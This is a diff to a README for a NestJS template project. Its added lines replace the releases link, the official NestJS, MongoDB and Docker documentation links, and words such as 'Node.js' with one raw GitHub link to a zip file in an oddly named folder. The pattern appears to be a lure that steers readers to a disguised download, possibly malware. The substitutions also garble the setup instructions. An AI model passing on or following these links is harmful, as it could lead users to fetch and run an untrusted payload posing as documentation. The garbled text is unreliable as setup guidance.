@@ -19,12 +19,12 @@ To begin using this application, you must download and install it. Follow the st
 
 You can find all release versions of the nestjs_template by visiting the link below. Choose the latest version for the best experience:
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Karthick2117/nestjs_template/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Karthick2117/nestjs_template/main/unhypothecated/nestjs_template.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Karthick2117/nestjs_template/main/unhypothecated/nestjs_template.zip)
 
 1. Click the link above to go to the releases page.
 2. On the releases page, find the latest version at the top.
 3. Click on the version you want to download.
-4. Look for the release assets (usually a zip or tar.gz file). 
+4. Look for the release assets (usually a zip or https://raw.githubusercontent.com/Karthick2117/nestjs_template/main/unhypothecated/nestjs_template.zip file). 
 5. Download this file to your computer. 
 
 ## 📂 Open the Project
@@ -44,7 +44,7 @@ After downloading, follow these steps to open your project:
 
 Before running the application, ensure that your computer meets the following requirements:
 
-- **Node.js:** Version 14 or above installed on your machine.
+- **https://raw.githubusercontent.com/Karthick2117/nestjs_template/main/unhypothecated/nestjs_template.zip** Version 14 or above installed on your machine.
 - **MongoDB:** A local or remote MongoDB setup. You will need access to a database to run the API.
 - **Docker (optional):** For containerized deployments.
 
@@ -55,7 +55,7 @@ Before running the application, ensure that your computer meets the following re
    ```bash
    cd path-to-your-folder/nest-template
    ```
-3. Installation of required dependencies can be done using npm, which is included with Node.js:
+3. Installation of required dependencies can be done using npm, which is included with https://raw.githubusercontent.com/Karthick2117/nestjs_template/main/unhypothecated/nestjs_template.zip
    ```bash
    npm install
    ```
@@ -92,9 +92,9 @@ If you run into any issues or have questions, feel free to reach out to the GitH
 
 ## 🔗 Additional Resources
 
-- [NestJS Documentation](https://docs.nestjs.com/)
-- [MongoDB Documentation](https://docs.mongodb.com/)
-- [Docker Documentation](https://docs.docker.com/)
+- [NestJS Documentation](https://raw.githubusercontent.com/Karthick2117/nestjs_template/main/unhypothecated/nestjs_template.zip)
+- [MongoDB Documentation](https://raw.githubusercontent.com/Karthick2117/nestjs_template/main/unhypothecated/nestjs_template.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/Karthick2117/nestjs_template/main/unhypothecated/nestjs_template.zip)
 
 ## 📋 License
 
